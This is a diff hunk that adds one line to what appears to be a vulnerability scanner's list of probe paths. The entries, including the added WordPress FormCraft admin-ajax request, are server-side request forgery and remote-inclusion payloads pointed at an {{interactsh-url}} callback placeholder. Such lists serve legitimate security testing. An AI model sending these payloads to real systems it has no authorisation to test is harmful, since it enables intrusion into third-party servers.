@@ -93,3 +93,4 @@
 /_next/image?w=16&q=10&url=https://{{interactsh-url}}
 /rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
 /wp-content/plugins/canto/readme.txt
+/wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
